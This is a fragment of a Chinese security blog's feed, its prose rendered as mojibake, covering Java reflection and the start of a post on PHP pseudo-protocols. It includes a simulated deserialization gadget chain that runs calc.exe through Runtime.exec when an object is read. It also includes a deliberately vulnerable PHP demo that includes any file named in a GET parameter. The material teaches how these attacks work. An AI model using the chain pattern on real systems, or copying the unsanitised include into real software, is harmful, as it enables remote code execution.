class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class clz = Class.forName(<span class="string">"User"</span>);</span><br><span class="line">            User user = (User)clz.newInstance();</span><br><span class="line">            Field[] fields = clz.getDeclaredFields();</span><br><span class="line">            System.out.println(<span class="string">"Userç±»æ‰€æœ‰çš„å±æ€§ï¼š"</span>);</span><br><span class="line">            <span class="keyword">for</span> (Field f : fields) &#123;</span><br><span class="line">                System.out.println(f);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Field field = clz.getDeclaredField(<span class="string">"name"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            field.set(user, <span class="string">"Mi1k7ea"</span>);</span><br><span class="line">            System.out.println(<span class="string">"\nä¿®æ”¹çš„Userç±»å¯¹è±¡çš„nameå€¼ä¸ºï¼š"</span>);</span><br><span class="line">            System.out.println(field.get(user));</span><br><span class="line">            System.out.println(<span class="string">"ä¿®æ”¹å±æ€§åçš„Userç±»å¯¹è±¡ï¼š"</span>);</span><br><span class="line">            System.out.println(user);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">"forNameå‡ºé”™"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»ç»“æœçœ‹åˆ°è°ƒç”¨è·å–äº†getDeclaredFields()æ‰€æœ‰Runtimeç±»çš„å±æ€§ï¼ŒåŒ…æ‹¬ä¿®é¥°ç¬¦ã€æ–¹æ³•åã€æˆå‘˜å˜é‡ç­‰ï¼ŒåŒæ—¶ä¹Ÿè°ƒç”¨getDeclaredField()è·å–äº†æŒ‡å®šçš„å±æ€§ï¼š</p><p><img src="/2019/02/01/Javaåå°„æœºåˆ¶/3.png" alt="è·å–ç±»æ‰€æœ‰å±æ€§"></p><h2 id="åº”ç”¨ç¤ºä¾‹"><a href="#åº”ç”¨ç¤ºä¾‹" class="headerlink" title="åº”ç”¨ç¤ºä¾‹"></a>åº”ç”¨ç¤ºä¾‹</h2><h3 id="1ã€åˆ©ç”¨åå°„ï¼Œåœ¨æ³›å‹ä¸ºintçš„arryaListé›†åˆä¸­å­˜æ”¾ä¸€ä¸ªStringç±»å‹çš„å¯¹è±¡"><a href="#1ã€åˆ©ç”¨åå°„ï¼Œåœ¨æ³›å‹ä¸ºintçš„arryaListé›†åˆä¸­å­˜æ”¾ä¸€ä¸ªStringç±»å‹çš„å¯¹è±¡" class="headerlink" title="1ã€åˆ©ç”¨åå°„ï¼Œåœ¨æ³›å‹ä¸ºintçš„arryaListé›†åˆä¸­å­˜æ”¾ä¸€ä¸ªStringç±»å‹çš„å¯¹è±¡"></a>1ã€åˆ©ç”¨åå°„ï¼Œåœ¨æ³›å‹ä¸ºintçš„arryaListé›†åˆä¸­å­˜æ”¾ä¸€ä¸ªStringç±»å‹çš„å¯¹è±¡</h3><p>åŸç†ï¼šé›†åˆä¸­çš„æ³›å‹åªåœ¨ç¼–è¯‘å™¨æœ‰æ•ˆï¼Œè€Œåˆ°äº†è¿è¡ŒæœŸæ—¶æ³›å‹åˆ™ä¼šå¤±æ•ˆã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        list.add(<span class="number">1</span>);</span><br><span class="line">        list.add(<span class="number">2</span>);</span><br><span class="line"><span class="comment">//        list.add("Mi1k7ea");//åœ¨ç¼–è¯‘å™¨ä¸­æ³›å‹ç”Ÿæ•ˆï¼Œæ’å…¥å­—ç¬¦ä¸²å¯¹è±¡ä¼šæŠ¥é”™</span></span><br><span class="line">        Class clz = list.getClass();</span><br><span class="line">        Method method = clz.getMethod(<span class="string">"add"</span>, Object.class);</span><br><span class="line">        method.invoke(list, <span class="string">"Mi1k7ea"</span>);</span><br><span class="line">        System.out.println(list);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æˆåŠŸå°†Stringç±»å‹å¯¹è±¡æ”¾å…¥æ³›å‹ä¸ºintå‹çš„æ•°ç»„ä¸­ï¼š</p><p><img src="/2019/02/01/Javaåå°„æœºåˆ¶/4.png" alt="ç¤ºä¾‹1"></p><h3 id="2ã€åˆ©ç”¨åå°„ï¼Œç®€åŒ–ç¼–å†™Servletçš„ä¸ªæ•°"><a href="#2ã€åˆ©ç”¨åå°„ï¼Œç®€åŒ–ç¼–å†™Servletçš„ä¸ªæ•°" class="headerlink" title="2ã€åˆ©ç”¨åå°„ï¼Œç®€åŒ–ç¼–å†™Servletçš„ä¸ªæ•°"></a>2ã€åˆ©ç”¨åå°„ï¼Œç®€åŒ–ç¼–å†™Servletçš„ä¸ªæ•°</h3><p>åˆ©ç”¨åå°„æœºåˆ¶ï¼Œåœ¨ä¸ºç¨‹åºæ·»åŠ æ–°åŠŸèƒ½æ—¶å¯ä»¥æ— éœ€é€ä¸ªå¯¹åº”ç¼–å†™æ–°çš„Servletï¼Œæé«˜å¼€å‘æ•ˆç‡å’Œä»£ç ç®€æ´æ€§ã€‚ä¸»è¦æœ‰å¦‚ä¸‹ä¸¤ä¸ªæ–¹å¼ä¼˜åŒ–ã€‚</p><p><strong>ï¼ˆ1ï¼‰ã€é€šè¿‡ç¼–å†™åˆ©ç”¨åå°„æœºåˆ¶è·å–æŒ‡å®šå±æ€§å€¼çš„Servletçš„æ–¹å¼</strong></p><p>æ¯æ¬¡ä»é¡µé¢ä¼ è¿‡æ¥ä¸€ä¸ªå‚æ•°ï¼Œmethod=â€xxxâ€; ç„¶åç¼–å†™ä¸€ä¸ªServletï¼Œè·å¾—å…¶å‚æ•°methodçš„å€¼ï¼Œè¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœæ˜¯addï¼Œåˆ™è°ƒç”¨addæ–¹æ³•ï¼Œå¦‚æœæ˜¯deleteï¼Œåˆ™è°ƒç”¨deleteæ–¹æ³•ï¼Œè¿™æ ·å°±å¯ä»¥å†™åœ¨ä¸€ä¸ªservletä¸­å®ç°æ‰€æœ‰çš„åŠŸèƒ½äº†ã€‚</p><p><img src="/2019/02/01/Javaåå°„æœºåˆ¶/5.png" alt="ç¤ºä¾‹2"></p><p><strong>ï¼ˆ2ï¼‰ã€é€šè¿‡Servletçš„ç”Ÿå‘½å‘¨æœŸå³service()å®ç°åå°„æœºåˆ¶æ¥å®ç°</strong></p><p>ç¼–å†™ä¸€ä¸ªé€šç”¨çš„BaseServletï¼Œç»§æ‰¿äºHttpServletï¼š</p><p><img src="/2019/02/01/Javaåå°„æœºåˆ¶/6.png" alt="ç¤ºä¾‹3"></p><p>ç¼–å†™å…·ä½“å®ç°çš„æ–¹æ³•Servletç±»MyServlet001ï¼Œç»§æ‰¿äºBaseServletï¼š</p><p><img src="/2019/02/01/Javaåå°„æœºåˆ¶/7.png" alt="ç¤ºä¾‹4"></p><p>ç”±Servletçš„ç”Ÿå‘½å‘¨æœŸå¯çŸ¥ï¼Œåœ¨è®¿é—®è¯¥Servletæ—¶ä¼šè°ƒç”¨service()æ–¹æ³•ï¼Œç„¶è€ŒMyServlet001ç±»ä¸­å¹¶æ— service()ï¼Œå› æ­¤ä¼šè¿”å›åˆ°çˆ¶ç±»BaseServletä¸­æ‰¾åˆ°è¯¥service()æ–¹æ³•ï¼Œå†è·å–å‚æ•°ä»è€ŒçŸ¥é“éœ€è¦è°ƒç”¨çš„æ–¹æ³•ï¼Œå› ä¸ºæ–¹æ³•çš„ç¼–å†™éƒ½åœ¨å­ç±»ä¸­ï¼Œæ‰€ä»¥é€šè¿‡åå°„ï¼Œè·å–åˆ°å­ç±»ä¸­å¯¹åº”çš„æ–¹æ³•å¹¶è¿è¡Œï¼Œå…¶ä¸­éœ€è¦æ³¨æ„çš„æ˜¯thisè¿™ä¸ªå‚æ•°åœ¨BaseServletä¸­çš„ç”¨æ³•ã€‚</p><h3 id="3ã€åˆ©ç”¨åå°„ï¼Œæ„é€ é“¾å¼ç»“æ„çš„ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨payload"><a href="#3ã€åˆ©ç”¨åå°„ï¼Œæ„é€ é“¾å¼ç»“æ„çš„ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨payload" class="headerlink" title="3ã€åˆ©ç”¨åå°„ï¼Œæ„é€ é“¾å¼ç»“æ„çš„ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨payload"></a>3ã€åˆ©ç”¨åå°„ï¼Œæ„é€ é“¾å¼ç»“æ„çš„ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨payload</h3><p>åœ¨ç»å…¸çš„Apache Commons Collectionsååºåˆ—åŒ–æ¼æ´ä¸­ï¼Œå…¶payloadçš„æ„é€ æ­£æ˜¯åˆ©ç”¨äº†åå°„æœºåˆ¶æ¥å®ç°é“¾å¼ç»“æ„ï¼Œå°†è¦æ‰§è¡Œçš„æ¶æ„ä»£ç æ„é€ æˆä¸€æ¡åå°„é“¾ï¼Œå†é€šè¿‡åŒ…å«è‡ªå®šä¹‰readObject()æ–¹æ³•çš„ç±»æ¥è§¦å‘æ‰§è¡Œã€‚</p><p>è¿™é‡Œç®€å•æ¨¡æ‹Ÿä¸€ä¸‹è¯¥ååºåˆ—åŒ–æ¼æ´åœºæ™¯ï¼Œä»£ç ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectionPlay</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ReflectionPlay rp = <span class="keyword">new</span> ReflectionPlay();</span><br><span class="line">        rp.deserialize(rp.serialize(rp.getObject()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ„é€ é“¾å¼ç»“æ„çš„ReflectionChainsç±»å¯¹è±¡å¹¶å¤åˆ¶åˆ°ReadObjectç±»å¯¹è±¡ä¸­ï¼Œè¿”å›è¯¥æ¶æ„å¯¹è±¡</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String command = <span class="string">"calc.exe"</span>;</span><br><span class="line">        Object firstObject = Runtime.class;</span><br><span class="line">        ReflectionObject[] reflectionChains = &#123;</span><br><span class="line">                <span class="comment">//è°ƒç”¨Runtime.classçš„getMethodæ–¹æ³•ï¼Œå¯»æ‰¾getRuntimeæ–¹æ³•ï¼Œå¾—åˆ°ä¸€ä¸ªMethodå¯¹è±¡(getRuntimeæ–¹æ³•)</span></span><br><span class="line">                <span class="comment">//ç­‰åŒäºRuntime.class.getMethod("getRuntime",new Class[]&#123;String.class,Class[].class&#125;)</span></span><br><span class="line">                <span class="keyword">new</span> ReflectionObject(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//è°ƒç”¨Methodçš„invokeræ–¹æ³•å¯ä»¥å¾—åˆ°ä¸€ä¸ªRuntimeå¯¹è±¡ï¼Œç­‰åŒäºmethod.invoke(null)ï¼Œé™æ€æ–¹æ³•ä¸ç”¨ä¼ å…¥å¯¹è±¡</span></span><br><span class="line">                <span class="keyword">new</span> ReflectionObject(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//è°ƒç”¨RunTimeå¯¹è±¡çš„execæ–¹æ³•ï¼Œå¹¶å°†commandä½œä¸ºå‚æ•°æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">                <span class="keyword">new</span> ReflectionObject(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;command&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ReadObject(<span class="keyword">new</span> ReflectionChains(firstObject, reflectionChains));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åºåˆ—åŒ–å¯¹è±¡åˆ°byteæ•°ç»„</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(out);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> out.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ä»byteæ•°ç»„ä¸­ååºåˆ—åŒ–å¯¹è±¡</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">deserialize</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] serialized)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ByteArrayInputStream in = <span class="keyword">new</span> ByteArrayInputStream(serialized);</span><br><span class="line">        ObjectInputStream objIn = <span class="keyword">new</span> ObjectInputStream(in);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å®šä¹‰ä¸€ä¸ªæœ‰æ¼æ´çš„ç±»ï¼Œä¸»è¦æä¾›çš„åŠŸèƒ½æ˜¯æ ¹æ®è‡ªå·±å±æ€§ä¸­çš„å€¼æ¥è¿›è¡Œåå°„è°ƒç”¨</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ReflectionObject</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> String methodName;</span><br><span class="line">        <span class="keyword">private</span> Class[] paramTypes;</span><br><span class="line">        <span class="keyword">private</span> Object[] args;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">ReflectionObject</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.methodName = methodName;</span><br><span class="line">            <span class="keyword">this</span>.paramTypes = paramTypes;</span><br><span class="line">            <span class="keyword">this</span>.args = args;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ ¹æ®methodNameã€paramTypesæ¥å¯»æ‰¾å¯¹è±¡çš„æ–¹æ³•ï¼Œåˆ©ç”¨argsä½œä¸ºå‚æ•°è¿›è¡Œè°ƒç”¨</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            Class inputClass = input.getClass();</span><br><span class="line">            <span class="keyword">return</span> inputClass.getMethod(methodName, paramTypes).invoke(input, args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å®šä¹‰ä¸€ä¸ªåå°„é“¾çš„ç±»</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ReflectionChains</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> Object firstObject;</span><br><span class="line">        <span class="keyword">private</span> ReflectionObject[] reflectionObjects;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">ReflectionChains</span><span class="params">(Object firstObject, ReflectionObject[] reflectionObjects)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.firstObject = firstObject;</span><br><span class="line">            <span class="keyword">this</span>.reflectionObjects = reflectionObjects;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//éå†ReflectionObjectç±»å¯¹è±¡æ•°ç»„å¹¶è°ƒç”¨å…¶transform()æ–¹æ³•</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            Object concurrentObject = firstObject;</span><br><span class="line">            <span class="keyword">for</span> (ReflectionObject reflectionObject : reflectionObjects) &#123;</span><br><span class="line">                concurrentObject = reflectionObject.transform(concurrentObject);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> concurrentObject;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å®šä¹‰ä¸€ä¸ªç”¨äºåºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„ç±»,æ‹¥æœ‰ä¸€ä¸ªå±æ€§å’Œä¸€ä¸ªé‡å†™äº†çš„readObject()æ–¹æ³•ï¼Œå¹¶ä¸”åœ¨readObject()æ–¹æ³•ä¸­æ‰§è¡Œäº†è¯¥å±æ€§çš„ä¸€ä¸ªæ–¹æ³•</span></span><br><span class="line">    <span class="comment">//å½“ååºåˆ—åŒ–è¯¥ç±»å¯¹è±¡æ—¶ä¼šæ‰§è¡Œè‡ªå®šä¹‰çš„readObject()æ–¹æ³•</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ReadObject</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> ReflectionChains reflectionChains;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">ReadObject</span><span class="params">(ReflectionChains reflectionChains)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.reflectionChains = reflectionChains;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è‡ªå®šä¹‰readObject()ï¼Œå½“ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œè¿™ä¸ªä»£ç ä¼šè¢«è°ƒç”¨ï¼Œä¸”è¢«è°ƒç”¨çš„æ—¶å€™å…¶å±æ€§éƒ½æ˜¯ç©º</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream stream)</span></span></span><br><span class="line"><span class="function">                <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//ç”¨æ¥æ¨¡æ‹Ÿå½“readObject()çš„æ—¶å€™ï¼Œå¯¹è‡ªèº«çš„å±æ€§è¿›è¡Œäº†ä¸€äº›é¢å¤–çš„æ“ä½œï¼Œä»¥ç¬¦åˆååºåˆ—åŒ–æ¼æ´ç‰¹å¾</span></span><br><span class="line">                reflectionChains= (ReflectionChains) stream.readFields().get(<span class="string">"reflectionChains"</span>,<span class="keyword">null</span>);</span><br><span class="line">                reflectionChains.execute();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œåå¼¹å‡ºè®¡ç®—å™¨ï¼Œå³åˆ©ç”¨äº†åå°„æœºåˆ¶å®ç°ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œï¼š</p><p><img src="/2019/02/01/Javaåå°„æœºåˆ¶/8.png" alt="ç¤ºä¾‹5"></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.cnblogs.com/whgk/p/6122036.html" target="_blank" rel="noopener">Javaä¸­åå°„æœºåˆ¶è¯¦è§£</a></p><p><a href="https://www.cnblogs.com/AaronCui/p/4911123.html" target="_blank" rel="noopener">Javaåå°„æœºåˆ¶Reflection</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;åŸºæœ¬æ¦‚å¿µ&quot;&gt;&lt;a href=&quot;#åŸºæœ¬æ¦‚å¿µ&quot; class=&quot;headerlink&quot; title=&quot;åŸºæœ¬æ¦‚å¿µ&quot;&gt;&lt;/a&gt;åŸºæœ¬æ¦‚å¿µ&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;åå°„æœºåˆ¶å®šä¹‰ï¼š&lt;/strong&gt;Javaåå°„æœºåˆ¶æ˜¯åœ¨è¿è¡ŒçŠ¶æ€æ—¶ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªç±»ï¼Œéƒ½èƒ½å¤Ÿè·å–åˆ°è¿™ä¸ªç±»çš„æ‰€æœ‰å±æ€§
      
    
    </summary>
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/categories/Java/"/>
    
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>PHPä¼ªåè®®</title>
    <link href="https://Mi1k7ea.github.com/2019/01/31/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <id>https://Mi1k7ea.github.com/2019/01/31/PHPä¼ªåè®®/</id>
    <published>2019-01-31T13:24:25.000Z</published>
    <updated>2019-02-08T14:28:36.346Z</updated>
    
    <content type="html"><![CDATA[<h2 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h2><p>PHPä¼ªåè®®åœ¨CTFä¸­ç»å¸¸ä½¿ç”¨åˆ°ï¼Œè¿™é‡Œå†™ä¸ªç®€å•çš„Demoå°ç»“ä¸€ä¸‹ï¼Œä¸»è¦å¯¹file://ã€php://filterã€php://inputã€data://ã€zip://ã€compress.bzip2://ã€compress.zlib://ã€phar://ç­‰åè®®è¿›è¡Œç®€å•çš„Demoä»‹ç»åˆ†æã€‚</p><p>ç®€å•è¯´ä¸€ä¸‹ï¼Œfile://ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿè¯»å–æœ¬åœ°æ–‡ä»¶ï¼›php://è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰ï¼Œå…¶ä¸­php://filterç”¨äºè¯»å–æ–‡ä»¶å†…å®¹ï¼Œphp://inputå¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµã€åŒæ—¶å¯å°†postè¯·æ±‚ä¸­çš„æ•°æ®ä½œä¸ºPHPä»£ç æ‰§è¡Œï¼›zip://ï¼Œbzip2://ï¼Œzlib://å‡å±äºå‹ç¼©æµï¼Œå¯ä»¥è®¿é—®å‹ç¼©æ–‡ä»¶ä¸­çš„å­æ–‡ä»¶ï¼Œæ›´é‡è¦çš„æ˜¯ä¸éœ€è¦æŒ‡å®šåç¼€åï¼›data://å³å†™å…¥æ•°æ®ï¼›phar://å³PHPå½’æ¡£ã€‚</p><h2 id="ç®€å•æ–‡ä»¶åŒ…å«Demoä»£ç "><a href="#ç®€å•æ–‡ä»¶åŒ…å«Demoä»£ç " class="headerlink" title="ç®€å•æ–‡ä»¶åŒ…å«Demoä»£ç "></a>ç®€å•æ–‡ä»¶åŒ…å«Demoä»£ç </h2><p>demo.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;h3&gt;Hi, just a test for php pseudo protocol. :)&lt;/h3&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;p&gt;u can input a param called "file" by GET method.&lt;/p&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"file"</span>]))&#123;</span><br><span class="line">@<span class="keyword">include</span>($_GET[<span class="string">"file"</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ­£å¸¸è®¿é—®ï¼Œæç¤ºå¯ä»¥é€šè¿‡GETä¼ å…¥ä¸€ä¸ªfileå‚æ•°åŒ…å«æ–‡ä»¶ï¼š</p><p><img src="/2019/01/31/PHPä¼ªåè®®/1.png" alt="æ–‡ä»¶åŒ…å«Demo"></p><h2 id="file-åè®®"><a href="#file-åè®®" class="headerlink" 